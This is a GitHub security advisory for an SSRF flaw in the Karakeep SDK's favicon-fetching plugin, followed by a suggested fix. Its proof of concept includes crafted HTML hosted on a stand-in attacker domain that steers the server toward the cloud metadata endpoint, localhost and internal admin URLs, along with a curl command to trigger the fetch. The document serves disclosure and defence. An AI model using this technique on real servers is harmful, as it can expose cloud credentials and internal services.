# [H] Karakeep SDK has SSRF via metascraper-logo-favicon that bypasses validateUrl protections

## Summary
Severity: High
Advisory: GHSA-7rx4-c5vx-g8w3
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-7rx4-c5vx-g8w3
Type: github-advisory

## Affected
- npm: `@karakeep/sdk` — affected >=0 <0.32.0

## Details
## Summary

The `metascraper-logo-favicon` plugin makes HTTP requests to URLs extracted from attacker-controlled HTML without going through the application's `validateUrl()` SSRF protections. This allows any authenticated user to make the server fetch arbitrary internal URLs by bookmarking a page containing a crafted `<link rel="icon">` tag.

## Details

### Protected path (correct)

Karakeep implements comprehensive SSRF protections in `apps/workers/network.ts` (lines 12-222). The `validateUrl()` function blocks loopback, private, link-local, carrier-grade NAT, and reserved IP ranges. It resolves DNS before the fetch and checks all resolved IPs against the blacklist. This function is correctly used by `fetchWithProxy()` for the main bookmark URL fetch, image downloads, RSS feeds, and webhooks.

### Unprotected path (vulnerability)

After fetching the page HTML (with SSRF protection), the content is passed to a parse subprocess (`apps/workers/scripts/parseHtmlSubprocess.ts`). Inside this subprocess, `metascraper-logo-favicon` (v5.49.5) extracts favicon URLs from the HTML DOM by matching `<link rel="icon">` elements and reading their `href` attribute.

The plugin then calls `reachable-url` (which wraps `got`) to verify each extracted URL. These HTTP requests bypass `validateUrl()` entirely:

```typescript
// apps/workers/scripts/parseHtmlSubprocess.ts, lines 62-73
metascraperLogo({
    gotOpts: {
      agent: {
        http: serverConfig.proxy.httpProxy
          ? new HttpProxyAgent(getRandomProxy(serverConfig.proxy.httpProxy))
          : undefined,
        https: serverConfig.proxy.httpsProxy
          ? new HttpsProxyAgent(getRandomProxy(serverConfig.proxy.httpsProxy))
          : undefined,
      },
    },
  }),
```

Only proxy agent configuration is provided. No URL validation hooks, no IP blacklist, no DNS resolution checks. The `got` HTTP client makes direct requests to whatever URLs are extracted from the HTML.

### Data flow

```
1. User creates bookmark → URL validated by validateUrl() ✓
2. Page HTML fetched → via fetchWithProxy() with SSRF protection ✓
3. HTML passed to parseHtmlSubprocess via stdin
4. metascraper-logo-favicon parses <link rel="icon"> tags from HTML
5. Plugin calls reachable-url → got.get(faviconUrl) → NO validateUrl() ✗
6. Server makes HTTP GET to attacker-controlled internal URL
```

### Comparison

The application explicitly protects the main URL fetch with `validateUrl()` (network.ts:136-222), which blocks all private/loopback IPs and resolves DNS before connecting. The recent commit history shows deliberate SSRF hardening ("Stricter SSRF validation" on 2025-11-02, allowlist feature on 2025-11-22). However, the metascraper plugins' internal HTTP requests are not routed through this validation.

## PoC

### 1. Set up a malicious page on a public URL

```html
<!-- Hosted at https://attacker.example.com/ssrf.html -->
<html>
<head>
  <title>Innocent Page</title>
  <link rel="icon" href="http://169.254.169.254/latest/meta-data/" sizes="256x256">
  <link rel="icon" href="http://127.0.0.1:3000/api/v1/users/whoami" sizes="128x128">
  <link rel="icon" href="http://192.168.1.1/admin" sizes="64x64">
</head>
<body><p>Normal content</p></body>
</html>
```

### 2. Create a bookmark via the API

```bash
curl -X POST http://localhost:3000/api/v1/bookmarks \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"type": "link", "url": "https://attacker.example.com/ssrf.html"}'
```

### 3. Result

The main URL (`https://attacker.example.com/ssrf.html`) passes `validateUrl()` since it resolves to a public IP. After the HTML is fetched, `metascraper-logo-favicon` extracts the favicon URLs and calls `reachable-url`/`got` to verify them. The server makes HTTP GET requests to:
- `http://169.254.169.254/latest/meta-data/` (AWS IMDS)
- `http://127.0.0.1:3000/api/v1/users/whoami` (localhost)
- `http://192.168.1.1/admin` (internal network)

These requests bypass all SSRF protections.

Verification: Monitor outbound network traffic from the karakeep container or check the logo field in the bookmark response.

## Impact

- **Cloud metadata access**: On AWS/GCP/Azure deployments, the server can be forced to fetch instance metadata (e.g., `http://169.254.169.254/latest/meta-data/iam/security-credentials/`) which may expose IAM credentials.
- **Internal service discovery**: Attacker can probe internal network services and ports by checking whether the favicon URL was reachable.
- **Redirect-based data leak**: If an internal service responds with a redirect, the final URL (potentially containing tokens or session data) is stored as the bookmark's logo field and visible to the attacker.
- **Bypass of explicit security controls**: The application's SSRF protections (IP blacklist, DNS resolution, redirect validation) are rendered ineffective for this code path.

## Suggested Fix

```diff
// apps/workers/scripts/parseHtmlSubprocess.ts
+ import { validateUrl } from "network";
+
+ // Create a got hook that validates URLs before requests
+ const ssrfHook = {
+   beforeRequest: [
+     async (options) => {
+       const result = await validateUrl(options.url.toString(), false);
+       if (!result.ok) {
+         throw new Error(`SSRF blocked: ${result.reason}`);
+       }
+     }
+   ]
+ };
+
  metascraperLogo({
      gotOpts: {
+       hooks: ssrfHook,
        agent: { ... },
      },
  }),
```

Alternatively, run the parse subprocess in a network-restricted sandbox (network namespace, nsjail, or a Docker container with restricted networking).

## References
- https://github.com/karakeep-app/karakeep/security/advisories/GHSA-7rx4-c5vx-g8w3
- https://github.com/karakeep-app/karakeep/pull/2763
- https://github.com/karakeep-app/karakeep/commit/3dc321e7d49aa3a1a2493637fb2ee21616fe5fd9
- https://github.com/karakeep-app/karakeep
- https://github.com/karakeep-app/karakeep/releases/tag/v0.32.0
